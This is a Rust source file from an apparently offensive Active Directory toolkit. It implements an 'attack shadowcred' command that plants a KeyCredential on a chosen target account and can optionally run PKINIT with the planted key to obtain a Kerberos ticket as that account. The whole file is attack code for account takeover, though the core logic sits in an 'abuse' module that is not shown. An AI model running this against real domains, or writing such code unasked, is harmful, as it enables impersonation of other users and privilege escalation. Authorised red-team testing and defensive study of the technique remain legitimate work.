//! Shadow Credentials — thin, top-level wrapper over `attack abuse
//! --action add-keycred` (Phase 1) + `--action pkinit` (Phase 2).

use anyhow::Result;
use clap::Parser;

use crate::attacks::abuse::{abuse, AbuseAction, AbuseArgs};

#[derive(Parser)]
pub(crate) struct ShadowcredArgs {
    #[arg(long)]
    pub url: String,
    #[arg(long)]
    pub user: String,
    #[arg(long)]
    pub password: String,
    #[arg(long)]
    pub insecure: bool,
    /// sAMAccountName to plant the KeyCredential on.
    #[arg(long)]
    pub target: String,
    /// If set, also perform PKINIT with the fresh key and print the ccache path.
    #[arg(long)]
    pub pkinit: bool,
    /// KDC `host[:port]` (required with --pkinit).
    #[arg(long)]
    pub kdc: Option<String>,
    #[arg(long)]
    pub realm: Option<String>,
}

/// `attack shadowcred` — thin, top-level command for Shadow Credentials. Under the hood this
/// is `attack abuse --action add-keycred` (and, with `--pkinit`, `--action pkinit`).
pub(crate) async fn shadowcred(a: ShadowcredArgs) -> Result<()> {
    // Phase 1: plant the KeyCredential.
    abuse(AbuseArgs {
        auth: crate::shared_args::OptAuth {
            url: Some(a.url.clone()),
            user: Some(a.user.clone()),
            password: Some(a.password.clone()),
            insecure: a.insecure,
        },
        action: AbuseAction::AddKeycred,
        target: a.target.clone(),
        value: String::new(),
        kdc: a.kdc.clone(),
        realm: a.realm.clone(),
        ldap389: false,
        host: None,
    })
    .await?;
    if a.pkinit {
        let (kdc, realm) = match (a.kdc.as_ref(), a.realm.as_ref()) {
            (Some(k), Some(r)) => (k.clone(), r.clone()),
            _ => anyhow::bail!("--pkinit needs both --kdc and --realm"),
        };
        // Phase 2: PKINIT with the freshly-planted key to obtain a TGT as the target.
        abuse(AbuseArgs {
            auth: crate::shared_args::OptAuth {
                url: Some(a.url),
                user: Some(a.user),
                password: Some(a.password),
                insecure: a.insecure,
            },
            action: AbuseAction::Pkinit,
            target: a.target,
            value: String::new(),
            kdc: Some(kdc),
            realm: Some(realm),
            ldap389: false,
            host: None,
        })
        .await?;
    }
    Ok(())
}
